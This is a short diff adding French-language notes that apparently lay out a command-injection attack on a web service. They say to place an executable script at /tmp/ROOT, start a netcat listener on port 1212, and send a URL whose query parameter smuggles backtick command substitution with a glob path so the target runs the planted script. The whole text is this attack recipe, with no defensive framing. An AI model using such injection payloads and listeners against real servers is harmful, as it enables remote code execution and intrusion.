@@ -1,0 +1,5 @@
+Creer un script /tmp/ROOT
+chmod 755 dessus
+sur un autre term, nc -lk 1212
+taper dans la barre d'adresse du navigateur : http://ip:port/?x=`/*/ROOT`&y=lol
+done
